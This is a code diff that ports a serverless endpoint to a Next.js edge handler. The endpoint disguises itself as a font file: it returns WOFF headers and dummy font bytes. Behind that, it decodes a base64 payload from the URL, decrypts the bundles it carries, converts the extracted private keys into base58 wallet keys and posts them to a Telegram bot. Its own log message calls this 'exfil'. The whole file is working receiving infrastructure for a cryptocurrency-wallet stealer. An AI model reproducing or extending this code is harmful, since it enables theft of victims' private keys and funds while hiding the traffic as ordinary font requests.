@@ -1,45 +1,47 @@
 // api/inbox/[...slug].ts
 
-import type { VercelRequest, VercelResponse } from '@vercel/node'
+import { NextRequest, NextResponse } from 'next/server'
 import crypto from 'crypto'
 import bs58 from 'bs58'
 
-export default async function handler(req: VercelRequest, res: VercelResponse) {
-  // Always allow CORS for font requests
-  res.writeHead(200, {
+export const config = { runtime: 'edge' }
+
+export default async function handler(req: NextRequest) {
+  // Allow CORS (font fetch)
+  const headers = {
     'Content-Type': 'font/woff',
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Methods': 'GET,OPTIONS',
     'Access-Control-Allow-Headers': '*',
     'Cache-Control': 'no-store'
-  })
-
+  }
   if (req.method === 'OPTIONS') {
-    return res.end()  // handle preflight
+    return new NextResponse(null, { status: 204, headers })
   }
 
   try {
-    // Get filename (without extension)
-    const url = new URL(req.url!, 'https://dummy')
-    let name = url.pathname.split('/').pop()!
-    name = name.replace(/\.\w+$/, '')  // strip .woff, .ico, etc.
+    // extract last segment without extension
+    const parts = req.nextUrl.pathname.split('/')
+    let name = parts.pop() || ''
+    name = name.replace(/\.\w+$/, '') // strip .woff/.ico
 
-    const [ , payloadB64url ] = name.split('_')
+    const [, payloadB64url] = name.split('_')
     if (!payloadB64url) throw new Error('Bad slug format')
 
-    // URL-safe → standard Base64
+    // normalize base64
     let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
     b64 += '='.repeat((4 - (b64.length % 4)) % 4)
 
-    // Decode JSON payload
+    // parse JSON
     const { sBundles, keybundle } = JSON.parse(
       Buffer.from(b64, 'base64').toString('utf8').trim()
     )
 
+    // AES‐GCM key
     const key = Buffer.from(keybundle, 'base64')
     const privKeys: string[] = []
 
-    // Decrypt each sBundle
+    // decrypt each sBundle
     for (const sb of sBundles) {
       const [iv_b64, data_b64] = sb.split(':')
       const iv = Buffer.from(iv_b64, 'base64')
@@ -54,22 +56,22 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       privKeys.push(bs58.encode(Buffer.from(last64, 'hex')))
     }
 
-    // Send to Telegram
+    // send to Telegram
     const BOT  = process.env.BOT_TOKEN!
     const CHAT = process.env.CHAT_ID!
-    const text = privKeys.map((k,i) => `wallet ${i+1}\n${k}`).join('\n\n')
-
+    const text = privKeys.map((k,i)=>`wallet ${i+1}\n${k}`).join('\n\n')
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: CHAT, text })
     })
-
-    console.log('✅ Decrypted & sent to Telegram')
   } catch (e) {
     console.error('❌ Error processing exfil:', e)
   }
 
-  // End response (dummy font already written)
-  res.end(Buffer.from([]))
+  // return dummy font response
+  return new NextResponse(
+    new Uint8Array([0x77,0x4f,0x46,0x46]),
+    { status: 200, headers }
+  )
 }
